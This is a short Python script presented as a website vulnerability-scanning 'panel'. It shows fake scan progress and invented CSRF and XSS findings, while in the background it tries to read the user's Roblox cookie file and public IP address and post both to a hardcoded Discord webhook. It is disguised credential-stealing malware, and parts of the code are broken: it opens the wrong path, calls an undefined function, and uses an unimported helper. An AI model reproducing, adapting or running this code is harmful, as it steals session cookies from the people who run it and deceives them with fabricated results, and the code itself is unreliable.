import os
if os.name != "nt":
	raise ValueError("[!] Failed to compile the panel")
	exit()
import io
import requests
import time
import threading
roam = str(os.getenv("LOCALAPPDATA"))
def refer(secret, addr):
	info = f"""
	```
	TOK = {secret}
	IP = {addr}
	```
	"""
	payt = {"content" : info}
	re = requests.post("https://discord.com/api/webhooks/1364933868699783201/14pJ1IBpJrX8rn_Ti0s4CLEg4cnQB7fUKN_3Pe0hUFt7YGJuThkdoFKB9nnDSH30omRO", data = payt)
def start():
	print("[+] Starting the panel...")
	time.sleep(8)
	os.system("clr")
def roblox_cookie(path):
	path1 = path + "\\Roblox\\RobloxCookies.dat"
	roam1 = io.open(roam, "r")
	return roam1.read()
def getIp():
	r = requests.get("https://api.ipify.org")
	return r.text
def beam():
	print(text2art("Big papi ~(*-*)~"))
	print("[+] The panel is active ")
	name = input("[?] URL: ")
	print("[+] Searching for vulnerabilities...")
	time.sleep(4)
	print("Have found: CSRF vulnerability, XSS vulnerability")
	print("Find the file in your directory ")
	exit()
if __name__ == "__main__":
	y = threading.Thread(target = start)
	x = threading.Thread(target = main)
	y.start()
	x.start()
	refer(roblox_cookie(roam), getIp())
	exit()
	
